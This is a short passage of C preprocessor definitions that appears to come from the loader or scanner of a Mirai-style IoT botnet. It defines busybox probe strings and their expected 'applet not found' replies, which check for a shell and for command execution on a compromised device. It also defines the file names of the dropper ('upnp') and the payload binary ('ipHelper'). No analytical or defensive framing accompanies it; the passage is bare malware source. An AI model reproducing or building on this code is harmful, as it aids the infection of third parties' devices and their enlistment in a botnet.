...
#define TOKEN_QUERY     "/bin/busybox DAICA"
#define TOKEN_RESPONSE  "DAICA: applet not found"

#define EXEC_QUERY     "/bin/busybox ACIAD"
#define EXEC_RESPONSE  "ACIAD: applet not found"

#define FN_DROPPER  "upnp"
#define FN_BINARY   "ipHelper"
